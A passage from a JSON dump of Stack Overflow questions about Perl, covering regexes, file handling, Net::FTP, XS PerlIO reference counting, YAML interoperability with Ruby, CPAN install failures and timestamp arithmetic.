'DataSize' =&gt; '3071872'\n                      },\n        'SamplingRate' =&gt; '48000',\n        'BitsPerSample' =&gt; '16',\n        'AudioFormat' =&gt; 'MXF'\n      },\n      {\n        'AudioIndex' =&gt; {\n                        'StartByteOffset' =&gt; '32768',\n                        'DataSize' =&gt; '3071872'\n                      },\n        'SamplingRate' =&gt; '48000',\n        'BitsPerSample' =&gt; '16',\n        'AudioFormat' =&gt; 'MXF'\n      }\n    ];\n</code></pre>\n\n<p>So all seems right in the captured array. The array appears to have one element, and inside that one element there are four hashes. This is where I get stuck. I have no idea how to get the information in these hashes back out again. I've tried about 40 different things and I'm just banging my head against the wall. I'd love to either just pass the values of each hash into a simple local array (something like <code>@samplingrate</code> for example) where I have all four of these entries in it and can simply reference them by <code>$samplingrate[0]</code>, etc.</p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["perl","file-handling"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12739443,"title":"Write to file in perl","body":"<pre><code>#!/usr/local/bin/perl\n$files = \"C:\\\\Users\\\\A\\\\workspace\\\\CCoverage\\\\backup.txt\";\nunlink ($files);\nopen (OUTFILE, '&gt;&gt;$files');\nprint OUTFILE \"Something\\n\";\nclose (OUTFILE);\n</code></pre>\n\n<p>Above is a simple subroutine I wrote in perl. It doesn't seem to work. Some help please. Kinda new to perl.</p>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":70,"score":0,"question_id":12720904,"title":"perl string match issues","body":"<p>i have a script in which i need to skip comments, and i am able to achieve it partially...</p>\n\n<pre><code>IN :\n\n{****************************\n{test : test...test }\n\nScript:\n\nif ( $data =~  m/(^{\\*+$)/ ){\n}\n</code></pre>\n\n<p>With the above match i am able to identify the comment and skip it to get the next line..</p>\n\n<pre><code>Out:\n{test : test...test }\n</code></pre>\n\n<p>If the same comment consists of any space or any character in the place of *, my match fails..</p>\n\n<pre><code>IN:\n{** *****    or   {* abccd   or {*abce\n</code></pre>\n\n<p>All the above cases are failed to skip ...\nWhat might be worng in the match,...can any one help me out..</p>\n"},{"tags":["perl","shell","mod-perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12718866,"title":"Using perl system grep","body":"<p>Have the below perl grep <code>regex</code> and it's working properly.  </p>\n\n<pre><code>  my  @cont = grep {/,\\s*511747450\\s*,\\s*CAN2\\s*$/} @fileContents;\n</code></pre>\n\n<p>I want to convert it to unix system <code>grep</code> and I tried the same regex using <code>system</code> command in the below way and it's not working.     </p>\n\n<pre><code>  my $cmd=\"grep ,\\s*5117474501\\s*,\\s*CAN2\\s*\\$ \" . $dirPath . \"/\" .$fileName;\n  my $exitStatus =system($cmd);\n</code></pre>\n"},{"tags":["c++","regex","perl","boost-regex"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":407,"score":2,"question_id":2537799,"title":"How can I convert a Perl regex to work with Boost::Regex?","body":"<p>What is the Boost::Regex equivalent of this Perl regex for words that end with <code>ing</code> or <code>ed</code> or <code>en</code>?</p>\n\n<p><code>/ing$|ed$|en$/</code></p>\n\n<p>...</p>\n"},{"tags":["perl","unix","multiple-columns"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12731834,"title":"How to zero-fill first column of data","body":"<p>I have data like this in tab separated columns:</p>\n\n<pre><code>1   name1   attribute1\n1   name1   attribute2\n1   name1   attribute3\n31  name2   attribute1\n31  name2   attribute2\n31  name2   attribute3\n444 name3   attribute1\n444 name3   attribute2\n444 name3   attribute3\n</code></pre>\n\n<p>And I want to have it like this:</p>\n\n<pre><code>001 name1   attribute1\n001 name1   attribute2\n001 name1   attribute3\n031 name2   attribute1\n031 name2   attribute2\n031 name2   attribute3\n444 name3   attribute1\n444 name3   attribute2\n444 name3   attribute3\n</code></pre>\n\n<p>Can I do this in unix or perl for instance?</p>\n"},{"tags":["regex","perl","comments"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":12738254,"title":"remove end-of-line comments unless quoted","body":"<p>I need a Perl regex to remove end-of-line comments. I feel like I've Googled around for this and couldn't find just the right thing. Here are the details:</p>\n\n<p>EOL comment is indicated using a pound sign (#)</p>\n\n<p>Anything can be quoted using vertical bars (|)</p>\n\n<p>So the following has a comment:</p>\n\n<pre><code>foo bar #baz\n</code></pre>\n\n<p>But the following doesn't:</p>\n\n<pre><code>foo |quoted###with bars|\n</code></pre>\n\n<p>The following has a comment and a quote that contains the comment character:</p>\n\n<pre><code>foo |quoted###with bars| #comment here\n</code></pre>\n\n<p>The first thing I tried was <code>s/#(?=[^|]*$).*$//</code>, which unfortunately removes quoted pounds. The next thing that doesn't work is <code>/#(?=[^|]*$).*$//</code>, because it fails on multiline quotes, like the following:</p>\n\n<pre><code>foo |quote begins here ##still going\n        ##and it's still going| #this is a quote, though.\n</code></pre>\n\n<p>I feel like I may be able to glean something from the regex for C/C++ comments in <a href=\"http://perldoc.perl.org/perlfaq6.html#How-do-I-use-a-regular-expression-to-strip-C-style-comments-from-a-file?\" rel=\"nofollow\">perlfaq6</a>, but it's too complicated for me grab just the stuff I need (don't need multiline comments;).</p>\n\n<p>Can anyone provide a regex which removes EOL comments but ignores quoted comment characters?</p>\n"},{"tags":["perl","ftp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12737012,"title":"perl Net::FTP LS with subdirectories","body":"<p>The LS command is not giving what I expect in Net::FTP.  I expected it to return an array of strings (filenames), but I get an array, containing an array of strings. </p>\n\n<pre><code>use strict;\nuse Net::FTP::Common;\n\nmy ($host, $user, $pw) = ('&lt;ftp site&gt;', 'user', 'pw');\nmy $ftp = new Net::FTP($host) || die;\n$ftp-&gt;login($user, $pw) || die;\n\nmy $pwd = $ftp-&gt;pwd();\nmy $subDir = 'subdir/';\nmy $pattern = '*.txt';\n$ftp-&gt;cwd($subDir); \n\n$ftp-&gt;pasv(); # passive mode\nmy @files = $ftp-&gt;ls($pattern) || die;\n\n$ftp-&gt;cwd($pwd); \n</code></pre>\n\n<p>The files array looks like this, for example:</p>\n\n<p>@files[@array[0]] = 'filename.txt';</p>\n\n<p>I've also tried not Changing Directories, and just doing <code>$ftp-&gt;ls('subdir/*.txt');</code> with the same results.</p>\n\n<p>Why is it doing this? I am misunderstanding the return value?  This is on WINDOWS.</p>\n"},{"tags":["perl","xs","perl-io"],"answer_count":2,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":127,"score":6,"question_id":12729545,"title":"Why is this XS code that returns a PerlIO* leaky?","body":"<p>I am trying to write some XS code that exposes pieces a library to\nPerl code as a stream interface that can be written to. The\n<code>get_stream</code> function below is supposed to be a constructor that\nprepares and returns a PerlIO object. I figured that I only need the\n<code>Write</code> and <code>Close</code> methods, so I left all other function slots blank.</p>\n\n<pre><code>typedef struct {\n    struct _PerlIO base;\n    mylib_context* ctx;\n} PerlIOmylib;\n\n/* [...] */\n\nPERLIO_FUNCS_DECL(PerlIO_mylib_funcs) = {\n.fsize = sizeof(PerlIO_funcs),\n.name  = \"mylib\",\n.size  = sizeof(PerlIOmylib,\n.Write = mylib_write,\n.Close = mylib_close,\n};\n\n/* XS below */\n\nPerlIO*\nget_stream (SV* context_obj)\nCODE:\nmylib_context* ctx = (mylib_context*) SvIV (SvRV (context_obj));\nPerlIO* f = PerlIO_allocate (aTHX);\nf = PerlIO_push (aTHX, f, PERLIO_FUNCS_CAST(&amp;PerlIO_mylib_funcs), \"a\", NULL);\nPerlIOSelf(f, PerlIOmylib)-&gt;ctx = ctx;\nPerlIOBase(f)-&gt;flags |= PERLIO_F_OPEN;\nRETVAL = f;\nOUTPUT:\nRETVAL\n</code></pre>\n\n<p>When I use the provided interface like this...</p>\n\n<pre><code>{\n    my $fh = MyLib::get_stream($lib_ctx);\n    print $fh \"x\" x 300;\n}\n</code></pre>\n\n<p>... the <code>mylib_write</code> function gets called, so I haven't totally\nscrewed up so far. (I verified this by inserting debug printf\nstatements.) However, I would like the PerlIO object to be closed when\n<code>$fh</code> goes out of scope, just the way things work with regular\nfilehandles created by <code>open</code>. But at the moment, the <code>mylib_close</code>\nfunction is only called during interpreter shutdown.</p>\n\n<p>Directly calling <code>close</code> works fine, setting <code>$fh</code> to <code>undef</code> does\nnot.</p>\n\n<p><strong>UPDATE:</strong> Following ikegami's advice, I used <code>Devel::Peek::Dump</code> and <code>sv_dump</code>\nand found out that the handle returned <code>get_stream</code> function is a \"RV\"\nwhich points to a <code>SV = PVGV(...)</code>. The glob (<code>PVGV</code>) has its\nreference counter set to 3 which doesn't seem right.</p>\n\n<p>I added</p>\n\n<pre><code>CLEANUP:\nSvREFCNT_dec (SvRV (ST(0)));\nSvREFCNT_dec (SvRV (ST(0)));\n</code></pre>\n\n<p>which cures the symptom: The <code>close</code> function is called when <code>$fh</code>\ngoes out of scope at the end of the block. But I still don't quite\nunderstand the underlying problem.</p>\n\n<p>This is the C code generated for the <code>OUTPUT</code> section:</p>\n\n<pre><code>ST(0) = sv_newmortal();\n{\n    GV *gv = newGVgen(\"MyLib\");\n    if (do_open(gv, \"+&lt;&amp;\", 3, FALSE, 0, 0, RETVAL) )\n        sv_setsv(ST(0), sv_bless(newRV((SV*)gv), gv_stashpv(\"MyLib\",1)));\n    else\n        ST(0) = &amp;PL_sv_undef;\n}\nXSRETURN(1);\n</code></pre>\n\n<p>How does the GV's reference count end up at 3?</p>\n"},{"tags":["perl","reverse-engineering","cpan"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":46,"score":0,"question_id":12729596,"title":"opensource library TitanEngine and perl sdk/api","body":"<p>does perl has a wrapper over TitanEngine Library :</p>\n\n<p>( <a href=\"http://www.reversinglabs.com/resources/open-source/titanengine\" rel=\"nofollow\">http://www.reversinglabs.com/resources/open-source/titanengine</a> ) on cpan ,or is there a perl SDK for TitanEngine library as this Python SDK:\n <a href=\"http://www.reversinglabs.com/blog/titanengine-and-python-sdk\" rel=\"nofollow\">http://www.reversinglabs.com/blog/titanengine-and-python-sdk</a> </p>\n\n<p>if yes could someone provide where can i find it /or if there any suggestion for alternative framework has perl wrapper ?</p>\n"},{"tags":["perl","pdl"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":129,"score":1,"question_id":12112434,"title":"Perl - Returning the maximum value in a data set","body":"<p>I have never delved into the world of Perl before and I find it pretty confusing and could use some help. In the code below the calc() section returns a running average of an'input' over 'count' samples. I would like to modify that so the calc() returns the maximum value within the sample set. Thanks in advance for the help!</p>\n\n<pre><code>sub calc\n{\n    my ($this, $dim, $input, $count) = @_;\n\n    if ($count &lt; 1)\n    {\n        warn \"count=$count is less than 1.\";\n        return undef;\n    }\n\n    my $inputsum_in = $this-&gt;{inputsum};\n    my ($inputcumsum, $inputsum_out) = PDL::CumulativeSumOver2($input, $inputsum_in);\n\n    my $inputdelay = $this-&gt;delay('inputhistory', $input);\n    my $inputdelaysum_in = $this-&gt;{inputdelaysum};\n    my ($inputdelaycumsum, $inputdelaysum_out) = PDL::CumulativeSumOver2($inputdelay, $inputdelaysum_in);\n\n    $this-&gt;{inputsum} = $inputsum_out;\n    $this-&gt;{inputdelaysum} = $inputdelaysum_out;\n\n    my $sampleno = $this-&gt;{sampleno};\n    my $divider = $count;\n    if($sampleno &lt; $count)\n    {\n        my $last = $dim - 1;\n        $divider = sequence($dim) + ($sampleno + 1);\n        my $start = $count - $sampleno;\n        $divider-&gt;slice(\"$start:$last\") .= $count if $start &lt;= $last;\n        $this-&gt;{sampleno} = $sampleno + $dim;\n    }\n    return ($inputcumsum - $inputdelaycumsum) / $divider;\n}\n</code></pre>\n"},{"tags":["ruby","perl","yaml"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":162,"score":5,"question_id":12610187,"title":"YAML data exchange issues between Perl and Ruby","body":"<p>I'm having trouble with data being exchanged between Perl and Ruby via YAML. I have some values that look like number:number, such as <code>1:16</code>.</p>\n\n<p>Perl's YAML libraries (Tiny and XS) encode this as <code>1:16</code> without quotes. Ruby's YAML library (Psych) does not interpret this as a string, but instead somehow becomes the Fixnum value <code>4560</code>. I can't figure out how to fix this conversion issue on either side.</p>\n\n<p>Every value in the YAML for my use case should be an object or string.  So, I could tell the Perl YAML library to quote all values, if such an option existed. Or is there any way to tell the Ruby YAML library to interpret all values as strings? Any ideas?  </p>\n\n<p>Changing the language on either side is not logistically an option.</p>\n\n<p>Perl:</p>\n\n<pre><code>use YAML::XS qw(DumpFile);\nmy $foo={'abc'=&gt;'1:16'};\nDumpFile('test.yaml',$foo);\n</code></pre>\n\n<p>Ruby:</p>\n\n<pre><code>require('yaml')\nfoo=YAML.load_file('test.yaml')\nputs(foo['abc'])\n</code></pre>\n\n<p>The Ruby code will print <code>4560</code>. One of the comments figured out how you get <code>4560</code> from <code>1:16</code>, it's 1 hour, 16 minutes converted to seconds.  Uh, okay.</p>\n"},{"tags":["regex","perl","regex-greedy","lookbehind","negative-lookbehind"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":83,"score":3,"question_id":12714827,"title":"How to match words separated with single space vs words separated with multiple spaces","body":"<p>I need to separate the key and values from the text that looks like below</p>\n\n<blockquote>\n  <p>Student ID: &nbsp;0<br>\n  Department ID = &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;18432<br>\n  Name &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XYZ</p>\n</blockquote>\n\n<pre><code>Subjects:\nComputer Architecture\nAdvanced Network Security 2\n</code></pre>\n\n<p>In the above example Student ID, Department ID and Name are the keys and 0,18432, XYZ are values. The keys are separated from the values either by :,= or multiple spaces. I tried reg ex such as </p>\n\n<pre><code>    $line =~ /(([\\w\\(\\)]*\\s)*)([=:\\s?]?)\\s*(\\S.*)?$/;\n    $key   = $2;\n    $colon=$3;\n    $value = $4;\n</code></pre>\n\n<p>The problem I am facing is identifying when a word is separated with single space and when it is separated by more than one.</p>\n\n<p>The output I get is\nline is Student ID: 0\nkey is Student , value is ID: 0\nwhile I want key is Student ID and value is 0. For lines like Subjects: and Computer Architecture, the key should have Subjects and Computer Architecture. I have logic later when there is no value or colon, I append the strings to the previous key so it will look like Subjects=Computer Architecture;Advanced Network Security 2</p>\n\n<p>Update: Thanks Ikegami for indicating that I use look behind operator. But I still seem to have problem solving it.</p>\n\n<pre><code>$line=~/^(?: ( [^:=]+ ) (?&lt;!\\s\\s)\\s* [:=]\\s*|\\s*)(.*)$/x;\n</code></pre>\n\n<p>So When I say <code>(?&lt;!\\s\\s)\\s* [:=]\\s*|\\s*</code> I mean when there more than two spaces, consume all the spaces and when there are no two consecutive spaces look for : or = and consume spaces. So   if you pass below line to the expression, Shouldnt I be getting $1=Name and $2=ABC XYZ? </p>\n\n<pre><code>Name         ABC XYZ\n</code></pre>\n\n<p>What I seem to be getting is key is empty and value is Name         ABC XYZ.</p>\n"},{"tags":["perl","project","web-scraping"],"answer_count":5,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":1416,"score":1,"question_id":4861319,"title":"How can I get started with web page scraping using Perl?","body":"<p>I am interested in learning Perl. I am using Learning Perl books and cpan's web-sites for reference.</p>\n\n<p>I am looking forward to do some web/text scraping application using Perl to apply whatever I have learnt.</p>\n\n<p>Please suggest me some good options to begin with.</p>\n\n<p>(this is not a homework. want to do something in Perl that would help me exploit basic Perl features)</p>\n"},{"tags":["perl","excel","cygwin","win32ole"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":542,"score":2,"question_id":11407231,"title":"Problems reading a .xls file using Perl Win32::OLE under Cygwin","body":"<p>I have been fighting with this one for two days, I cannot find the solution and I'm getting frustrated. While using the code below under Cygwin I get this error</p>\n\n<p><strong>OLE exception from \"Microsoft Office Excel\": Excel cannot access 'Empty.xls'.<br>\nThe document may be read-only or encrypted.\nWin32::OLE(0.1703) error 0x800a03ec\n    in METHOD/PROPERTYGET \"Open\" at m:/In/make_excel.pl line 24</strong></p>\n\n<p>The thing is that under the DOS prompt it is working perfectly. The file is not readonly of course. I'm guessing there is some problem with the file format interpretation. \nAny hint? It would be highly appreciated.</p>\n\n<pre><code>#!/usr/bin/perl\nuse Win32::OLE;\nuse Win32::OLE::Variant;\nuse Win32::OLE::Const 'Microsoft Excel';\n$Excel = Win32::OLE-&gt;GetActiveObject('Excel.Application') ||\n   Win32::OLE-&gt;new('Excel.Application');\n$Excel-&gt;{'Visible'} = 0;        #0 is hidden, 1 is visible\n$Excel-&gt;{DisplayAlerts}=0;  #0 is hide alerts\n# Open File and Worksheet\nmy $Book = $Excel-&gt;Workbooks-&gt;Open('C:\\Empty.xls'); \n...\n</code></pre>\n"},{"tags":["python","perl","awk","split","gnu"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":140,"score":0,"question_id":12717294,"title":"Split one file into multiple files based on pattern (cut can occur within lines)","body":"<p>A lot of solutions exist, but the specificity here is I need to be able to split within a line, the cut should occur just before the pattern. Ex:</p>\n\n<p>Infile:</p>\n\n<pre><code>&lt;?xml 1&gt;&lt;blabla1&gt;\n&lt;blabla&gt;&lt;blabla2&gt;&lt;blabla&gt;\n&lt;blabla&gt;&lt;blabla&gt;\n&lt;blabla&gt;&lt;blabla3&gt;&lt;blabla&gt;&lt;blabla&gt;\n&lt;blabla&gt;&lt;blabla&gt;&lt;blabla&gt;&lt;?xml 4&gt;\n&lt;blabla&gt;\n&lt;blabla&gt;&lt;blabla&gt;&lt;blabla&gt;\n&lt;blabla&gt;&lt;?xml 2&gt;&lt;blabla&gt;&lt;blabla&gt;\n</code></pre>\n\n<p>Should become with pattern <code>&lt;?xml</code></p>\n\n<p>Outfile1:</p>\n\n<pre><code>&lt;?xml 1&gt;&lt;blabla1&gt;\n&lt;blabla&gt;&lt;blabla2&gt;&lt;blabla&gt;\n&lt;blabla&gt;&lt;blabla&gt;\n&lt;blabla&gt;&lt;blabla3&gt;&lt;blabla&gt;&lt;blabla&gt;\n&lt;blabla&gt;&lt;blabla&gt;&lt;blabla&gt;\n</code></pre>\n\n<p>Outfile2:</p>\n\n<pre><code>&lt;?xml 4&gt;\n&lt;blabla&gt;\n&lt;blabla&gt;&lt;blabla&gt;&lt;blabla&gt;\n&lt;blabla&gt;\n</code></pre>\n\n<p>Outfile3:</p>\n\n<pre><code>&lt;?xml 2&gt;&lt;blabla&gt;&lt;blabla&gt;\n</code></pre>\n\n<p>Actually the <code>perl</code> script in the validated answer <a href=\"http://stackoverflow.com/questions/8061475/split-one-file-into-multiple-files-based-on-pattern\">here</a> works fine for my little example. But it generates an error for my bigger (about 6GB) actual files. The error is:</p>\n\n<pre><code>panic: sv_setpvn called with negative strlen at /home/.../split.pl line 7, &lt;&gt; chunk 1.\n</code></pre>\n\n<p>I don't have the permissions to comment, that's why I started a new post.\nAnd finally, a <code>Python</code> solution would be even more appreciated, as I understand it better.</p>\n"},{"tags":["linux","perl","text","protocols","telnet"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":123,"score":0,"question_id":3540497,"title":"modify a datastream on the fly","body":"<p>I need to hijack and modify a datastream.  The stream consists of fixed-width commands.  Each command is a new line, and the documentation says that each command starts and ends with an STX/ETX pair (start and end of text) </p>\n\n<p>The sending system is using serial, but is attacked to an iPocket device that communicates over IP to our PBX. From what I can tell it's just converting the serial to telnet, which should keep things pretty simple hopefully.  </p>\n\n<p>The string I need to look for starts with \"NAM\". The structure is something like this: </p>\n\n<p>STX NAM EXT# LASTNAME,FIRSTNAME ETX</p>\n\n<p>I need to replace \",FIRSTNAME\" with whitespace so it doesn't change the length of the command.</p>\n\n<p>I've been attempting the following, and while it passes the data end to end in both directions as required,  and removes the needed data,  it isn't maintaining the length of the command. </p>\n\n<p>ipocket  &lt;->  nc -kl 1100 | sed 's/,[^,]*/ /g' | nc target_ip target_port  &lt;->  PBX</p>\n\n<p>I'll be using a linux box for this task.  I'm reasonably certain that this could be done quite simply in perl or python but I haven't got a clue where to start.  Any assistance would be greatly appreciated! </p>\n"},{"tags":["regex","perl","search-and-replace"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12728307,"title":"Search and replace string of certain length using Perl regex","body":"<p>I am trying to search and replace a string that is up to and including 3 characters in length with nothing (so 'deleting' the element contents).</p>\n\n<p>So I have something like: </p>\n\n<pre><code>foreach (@array) {\n   s/^{1,3}$//;\n}\n</code></pre>\n\n<p>E.g.</p>\n\n<pre><code>@array = ('one', 'two', 'three', 'four', 'five', 'six', 'seven');\n</code></pre>\n\n<p>So when printing, expected output would be:</p>\n\n<pre><code>result:  result:  result: three  result: four  result: five  result:  result: seven\n</code></pre>\n\n<p>So for the affected inputs, the output would be an 'empty place'.</p>\n\n<p>This at the moment doesn't happen... I'm betting I'm making a simple mistake due to my still-shaky understanding of regex. Any help appreciated! </p>\n\n<p>If there is a simple way to actually remove the element totally without creating a new array, that would also be useful to know. </p>\n"},{"tags":["perl","cpan"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":673,"score":1,"question_id":8893787,"title":"What does this CPAN error mean?","body":"<p>I would like to install <code>IO::Uncompress::Gunzip</code>, so I do</p>\n\n<p>perl -MCPAN -e shell\ninstall CPAN\ninstall IO::Uncompress::Gunzip</p>\n\n<p>and I get</p>\n\n<pre><code>cpan[11]&gt; install IO::Uncompress::Gunzip\nRunning install for module 'IO::Uncompress::Gunzip'\nRunning make for P/PM/PMQS/IO-Compress-2.046.tar.gz\n  Has already been unwrapped into directory /root/.cpan/build/IO-Compress-2.046-d_Y9xt\n---- Unsatisfied dependencies detected during ----\n----       PMQS/IO-Compress-2.046.tar.gz      ----\n    Compress::Raw::Zlib [requires]\n    Compress::Raw::Bzip2 [requires]\nShall I follow them and prepend them to the queue\nof modules we are processing right now? [yes] \n\n...\n\nResult: FAIL\nFailed 78/86 test programs. 35/328 subtests failed.\nmake: *** [test_dynamic] Error 255\n  PMQS/IO-Compress-2.046.tar.gz\n2 dependencies missing (Compress::Raw::Bzip2,Compress::Raw::Zlib); additionally test harness failed\n  /usr/bin/make test -- NOT OK\n//hint// to see the cpan-testers results for installing this module, try:\n  reports PMQS/IO-Compress-2.046.tar.gz\nRunning make install\n  make test had returned bad status, won't install without force\nFailed during this command:\n PMQS/IO-Compress-2.046.tar.gz                : make_test NO 2 dependencies missing (Compress::Raw::Bzip2,Compress::Raw::Zlib); additionally test harness failed\n</code></pre>\n\n<p>See full error output at <a href=\"http://pastebin.com/nGc80C8Z\" rel=\"nofollow\">http://pastebin.com/nGc80C8Z</a></p>\n\n<p>If I try to install <code>Compress::Raw::Bzip2</code> and <code>Compress::Raw::Zlib</code> I get</p>\n\n<pre><code>cpan[12]&gt; install Compress::Raw::Zlib\nRunning install for module 'Compress::Raw::Zlib'\nRunning make for P/PM/PMQS/Compress-Raw-Zlib-2.045.tar.gz\n  Has already been unwrapped into directory /root/.cpan/build/Compress-Raw-Zlib-2.045-kBMzIh\nCould not make: Unknown error\nRunning make test\n  Can't test without successful make\nRunning make install\n  Make had returned bad status, install seems impossible\n\ncpan[13]&gt; \n</code></pre>\n\n<p><strong>Question</strong></p>\n\n<p>Does anyone what these errors mean, and perhaps how I can install these modules?</p>\n"},{"tags":["c","perl","xs"],"answer_count":0,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":122,"score":4,"question_id":12728468,"title":"Perl 5.16.0 - Sample C program working but existing multi-thread C++ program is aborting in Perl_sv_upgrade","body":"<p>Perl 5.16.0 - Sample C program working but existing multi-thread program is aborting in Perl_sv_upgrade. multi-thread program works fine with Perl 5.8.8\nThe same code works on Linux and Solaris with Perl 5.16.0. </p>\n\n<p>Comparing the \"sv\" argument value between Linux and Hp-PA shows the \"sv\" value is NULL in case of Hp-PA. Did anybody notice this problem before. Please let me know?</p>\n\n<p><strong>Linux stack trace after debugging and seeing the sv value:</strong></p>\n\n<pre><code>Breakpoint 4, Perl_sv_upgrade (my_perl=0x14fe6400, sv=0x150317a8, new_type=SVt_PV) at          sv.c:1140\n1140    sv.c: No such file or directory.\n    in sv.c\n</code></pre>\n\n<p>(gdb) where\n    #0  Perl_sv_upgrade (my_perl=0x14fe6400, sv=0x150317a8, new_type=SVt_PV) at sv.c:1140</p>\n\n<p><strong>HP-PA stack trace after seeing the sv value while analyzing the abort in gdb:</strong> </p>\n\n<p>Thread 3 (system thread 428417):</p>\n\n<p>#3 signal handler called\n   #4  0xca9825c4 in Perl_sv_upgrade (my_perl=0x40236f10, sv=0x0, new_type=SVt_PV) at sv.c:1260</p>\n"},{"tags":["perl","memory","processes","shared","read-only"],"answer_count":3,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":182,"score":5,"question_id":12710258,"title":"Shared readonly memory between Perl processes","body":"<p>I wish to make a Perl program of mine use multiple cores. It progressively reads query input and compares chunks of that against a read-only data-structure loaded from file into memory for each run. That data-structure, which is typically a few giga-bytes, is a small set of packed strings that are used in small C-routines. When processes are forked, everything is copied, which on a multi-core machine quickly blows the RAM. I tried several non-standard modules, but all leads to slowness and/or blows the RAM. I thought, for read-only data, that Perl would not insist on making copies. Other languages can do it. Does anyone have ideas?</p>\n"},{"tags":["linux","perl","bash","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":801,"score":3,"question_id":9165572,"title":"Perl get UTC time and get difference between UTC timestamps","body":"<p>I'm looking for some Perl help on how to do this properly.  I don't mind using a library to do this.</p>\n\n<p>I'm pulling a UTC time stamp from a mySQL database, in this format:  2012-02-06 13:50:09</p>\n\n<p>I need Perl to pull the current UTC time and get the difference between the two time stamps in minutes (or seconds).  I was doing this in a Unix subprocess, but I'm having difficulty getting the UTC time and comparing it, since the local box is running on Eastern time.  I wouldn't mind doing this in Unix time, but not sure how to accurately get the UTC time to compare to the \"last_timestamp\" which is a UTC based timestamp from mysql.</p>\n\n<pre><code>my $date_diff = qx(date -d \"\\$(date +'%F %T')\" +%s) -\nqx(date -d            \"$last_timestamp\" +%s); \n</code></pre>\n\n<p>As always your help is certainly appreciated and valued.</p>\n"},{"tags":["perl","command-line","cgi","environment-variables"],"answer_count":4,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":320,"score":6,"question_id":1914966,"title":"How can I determine if a script was called from the command line or as a cgi script?","body":"<p>I have a script that I wrote that can either be used on the command line or as a CGI script, and need to determine how the script was called so I can output a content-type header for web requests (and maybe some anti-cache headers too). My first thought is to check for the existance of http environment variables:</p>\n\n<pre><code>my $js = build_javascript();\n\nif ( exists $ENV{HTTP_HOST} ) {\n   print \"Content-type: text/javascript\\n\\n\";\n}\nprint $js;\n</code></pre>\n\n<p>Is there a better way?</p>\n"},{"tags":["perl","binary","numbers"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1173,"score":0,"question_id":881177,"title":"How can I convert a binary number into a string character using Perl script?","body":"<p>How can I convert a binary number into a string character using Perl script?</p>\n"},{"tags":["json","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12724510,"title":"How to split this array so that i can get x and y in perl?","body":"<p>I have following array which i want to split so that i can get x and y values : \nHow to iterate through this array?</p>\n\n<pre><code>{\n  \"name\":\"abc\",\n  \"Time\":2.00,\n  \"abc\":[{\n     \"m\":\"2012-10-03T03:35:58.000Z\",\n     \"coords\":{\n        \"a\":337,\n        \"b\":820,\n        \"x\":12.96908596996218,\n        \"z\":5,\n        \"y\":77.71305229514837,\n        \"b\":0\n      }\n    },{\n    \"m\":\"2012-10-03T03:35:59.000Z\",\n    \"coords\":{\n       \"a\":337,\n       \"b\":820,\n       \"x\":12.96908596996218,\n       \"z\":5,\n       \"y\":77.71305229514837,\n       \"b\":0\n       }\n     }}]}\n</code></pre>\n\n<p>Any help?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":108,"score":-4,"question_id":12214116,"title":"Regex for matching any number between 0 to 100?","body":"<p>I need a regex to match any number between 0 to 100 including decimal numbers example:\nmy expression should match 1,2,2.3 ,40,40.12 ,100,100.00 like this ..thanks in advance?</p>\n"},{"tags":["perl","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12715661,"title":"Perl: How to pass information to a function in module?","body":"<p>Completely new to Perl here. Anyway, I was given a certain task and I found a perl module online that does <em>exactly</em> what I want. </p>\n\n<p><a href=\"http://jaspar.genereg.net/html/DOWNLOAD/jaspar_CORE/non_redundant/by_tax_group/vertebrates/matrix_only/matrix_only.txt\" rel=\"nofollow\">Matrix</a></p>\n\n<p><a href=\"http://tfbs.genereg.net/DOC/\" rel=\"nofollow\">Documentation</a></p>\n\n<p>This is the documentation for the perl module -- under Ext there is one called pwmsearch, which does exactly what I need.</p>\n\n<p>So I tried to write a script that starts out something like this:</p>\n\n<pre><code>#!/usr/bin/env perl -w\n\nuse strict; \nuse TFBS::Ext::pwmsearch; #this was how the documentation said in synopsis part for pwmsearch so I figured this was how to do it\n</code></pre>\n\n<p>The problem 